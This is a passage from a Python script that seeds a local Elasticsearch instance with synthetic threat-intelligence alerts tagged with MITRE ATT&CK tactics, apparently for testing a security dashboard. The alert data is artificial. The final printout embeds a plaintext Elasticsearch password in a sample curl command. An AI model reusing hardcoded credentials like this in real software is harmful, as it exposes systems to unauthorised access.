        "host.ip": [host[1]],
        "host.os.name": host[2],
        "user.name": user,
        "source.ip": src_ip,
        "source.geo": geo,
        "threat.tactic.name": [tactic],
        "threat.technique.id": [tech_id],
        "threat.technique.name": [tech_name],
        "message": msg,
        "tags": ["ion", "threat-intel"] + tags,
    }


# ---------------------------------------------------------------------------
# Index management
# ---------------------------------------------------------------------------

ION_MAPPING = {
    "mappings": {
        "properties": {
            "@timestamp": {"type": "date"},
            "event.severity": {"type": "keyword"},
            "event.action": {"type": "keyword"},
            "event.category": {"type": "keyword"},
            "event.kind": {"type": "keyword"},
            "rule.name": {"type": "keyword"},
            "rule.description": {"type": "text"},
            "message": {"type": "text"},
            "host.name": {"type": "keyword"},
            "host.hostname": {"type": "keyword"},
            "host.ip": {"type": "ip"},
            "host.os.name": {"type": "keyword"},
            "user.name": {"type": "keyword"},
            "user.domain": {"type": "keyword"},
            "source.ip": {"type": "ip"},
            "source.port": {"type": "integer"},
            "source.geo": {
                "properties": {
                    "country_name": {"type": "keyword"},
                    "city_name": {"type": "keyword"},
                    "location": {"type": "geo_point"},
                }
            },
            "destination.ip": {"type": "ip"},
            "destination.port": {"type": "integer"},
            "severity": {"type": "keyword"},
            "status": {"type": "keyword"},
            "tags": {"type": "keyword"},
            "process.name": {"type": "keyword"},
            "process.pid": {"type": "integer"},
            "file.path": {"type": "keyword"},
            "file.hash.sha256": {"type": "keyword"},
            "threat.technique.id": {"type": "keyword"},
            "threat.technique.name": {"type": "keyword"},
            "threat.tactic.name": {"type": "keyword"},
        }
    }
}


def ensure_ion_index(session):
    """Delete and recreate the alerts-ion index with proper mapping."""
    try:
        r = session.delete(f"{ES_URL}/{ION_INDEX}", timeout=10)
        print(f"  Deleted existing {ION_INDEX}: {r.status_code}")
    except Exception:
        pass

    r = session.put(f"{ES_URL}/{ION_INDEX}", json=ION_MAPPING, timeout=10)
    print(f"  Created {ION_INDEX}: {r.status_code}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    now = datetime.utcnow()

    session = requests.Session()
    session.auth = AUTH
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[502, 503, 504])
    session.mount("http://", HTTPAdapter(max_retries=retry))

    # Verify ES connection
    print("Connecting to Elasticsearch...")
    r = session.get(f"{ES_URL}/_cluster/health", timeout=30)
    health = r.json()
    print(f"  Cluster: {health['cluster_name']}, status: {health['status']}, nodes: {health['number_of_nodes']}")

    # Recreate ION index
    print(f"\nSetting up {ION_INDEX} index...")
    ensure_ion_index(session)

    # --- Build alerts-ion bulk body ---
    print(f"\nGenerating {len(ALERT_DEFS)} alerts for {ION_INDEX}...")
    ion_bulk = ""
    for alert_def in ALERT_DEFS:
        doc = _build_ion_alert(alert_def, now)
        ion_bulk += json.dumps({"index": {"_index": ION_INDEX}}) + "\n"
        ion_bulk += json.dumps(doc) + "\n"

    r = session.post(
        f"{ES_URL}/_bulk",
        data=ion_bulk,
        headers={"Content-Type": "application/x-ndjson"},
        timeout=30,
    )
    result = r.json()
    items = result.get("items", [])
    success = sum(1 for i in items if i.get("index", {}).get("status") in (200, 201))
    print(f"  Indexed: {success}/{len(items)}, errors: {result.get('errors', False)}")
    if result.get("errors"):
        for item in items:
            err = item.get("index", {}).get("error")
            if err:
                print(f"    ERROR: {err.get('type')}: {err.get('reason', '')[:120]}")

    # --- Build .alerts-security bulk body ---
    print(f"\nGenerating {len(ALERT_DEFS)} alerts for {SECURITY_INDEX}...")
    sec_bulk = ""
    sec_ids = []
    for alert_def in ALERT_DEFS:
        aid, doc = _build_security_alert(alert_def, now)
        sec_ids.append(aid)
        sec_bulk += json.dumps({"index": {"_index": SECURITY_INDEX, "_id": aid}}) + "\n"
        sec_bulk += json.dumps(doc) + "\n"

    r = session.post(
        f"{ES_URL}/_bulk",
        data=sec_bulk,
        headers={"Content-Type": "application/x-ndjson"},
        timeout=30,
    )
    result = r.json()
    items = result.get("items", [])
    success = sum(1 for i in items if i.get("index", {}).get("status") in (200, 201))
    print(f"  Indexed: {success}/{len(items)}, errors: {result.get('errors', False)}")
    if result.get("errors"):
        for item in items:
            err = item.get("index", {}).get("error")
            if err:
                print(f"    ERROR: {err.get('type')}: {err.get('reason', '')[:120]}")

    # Refresh both indices
    for idx in [ION_INDEX, SECURITY_INDEX]:
        r = session.post(f"{ES_URL}/{idx}/_refresh", timeout=10)
        count = session.get(f"{ES_URL}/{idx}/_count", timeout=10).json().get("count", 0)
        print(f"\n  {idx}: {count} alerts (refresh: {r.status_code})")

    # Summary
    print("\n" + "=" * 70)
    print("SEED COMPLETE")
    print("=" * 70)
    print(f"  ION index ({ION_INDEX}):    {len(ALERT_DEFS)} alerts")
    print(f"  Security index ({SECURITY_INDEX}): {len(ALERT_DEFS)} alerts")
    print(f"  Total: {len(ALERT_DEFS) * 2} alert documents")
    print()
    print("Threat actors represented:")
    actors = sorted(set(a[10] for a in ALERT_DEFS))
    for actor in actors:
        count = sum(1 for a in ALERT_DEFS if a[10] == actor)
        print(f"  - {actor}: {count} alerts")
    print()
    print("MITRE ATT&CK tactics covered:")
    tactics = sorted(set(a[7] for a in ALERT_DEFS))
    for t in tactics:
        count = sum(1 for a in ALERT_DEFS if a[7] == t)
        print(f"  - {t}: {count} alerts")
    print()
    print("Verify at:")
    print("  ION:   http://127.0.0.1:8000")
    print("  Kibana:  http://127.0.0.1:5601 > Security > Alerts")
    print("  ES API:  curl -u elastic:DocforgeTest123! http://127.0.0.1:9200/alerts-ion/_count")


if __name__ == "__main__":
    main()
